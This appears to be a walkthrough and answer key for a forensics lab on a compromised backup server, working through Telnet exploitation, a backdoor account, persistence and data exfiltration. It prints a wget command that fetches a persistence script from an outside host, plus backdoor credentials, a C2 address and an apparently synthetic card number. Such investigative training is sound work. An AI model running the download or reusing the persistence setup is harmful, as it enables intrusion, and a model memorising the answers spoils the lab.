Scenario:

You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

Artifacts:

  - monitoringservice_export_202610AM-11AM.pcapng

Q) What CVE is associated with the vulnerability exploited in the Telnet protocol?

<img width="1920" height="1080" alt="1" src="https://github.com/user-attachments/assets/d0788fd2-b7d9-4d06-9648-0745dd0ffd03" />

<img width="1920" height="1080" alt="2" src="https://github.com/user-attachments/assets/a6d170a9-95b4-43c7-ac3f-75db197ce610" />


**Answer: CVE-2026-24061**

Q) When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

<img width="1920" height="1080" alt="3" src="https://github.com/user-attachments/assets/31da575d-bada-46ab-8a10-1b9c2beb12ce" />


**Answer: 2026-01-27 10:39:28**

Q) What is the hostname of the targeted server?

<img width="1920" height="1080" alt="4" src="https://github.com/user-attachments/assets/f6f25ffa-2ae1-41d9-90f2-13dfe26ee8a0" />


**Answer: backup-secondary**

Q) The attacker created a backdoor account to maintain future access. What username and password were set for that account?

<img width="1920" height="1080" alt="5" src="https://github.com/user-attachments/assets/5d9c2db4-ddea-413e-87fb-bf6cc92352c5" />


**Answer: cleanupsvc:YouKnowWhoiam69**

Q) What was the full command the attacker used to download the persistence script?

<img width="1920" height="1080" alt="6" src="https://github.com/user-attachments/assets/e1db4e51-0176-44d6-be72-4f5f9d320993" />


**Answer: wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh**

Q) The attacker installed remote access persistence using the persistence script. What is the C2 IP address?

<img width="1920" height="1080" alt="7" src="https://github.com/user-attachments/assets/ad09151d-de70-4571-a48d-4580409e2976" />


**Answer: 91.99.25.54**

Q) The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

<img width="1920" height="1080" alt="8" src="https://github.com/user-attachments/assets/7693db5e-09c7-410e-abdc-18affe5c07d8" />


**Answer: 2026-01-27 10:49:54**

Q) Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

<img width="1920" height="1080" alt="9" src="https://github.com/user-attachments/assets/0ba654ad-1307-48ce-9820-399578277610" />


**Answer: 5312269047781209**
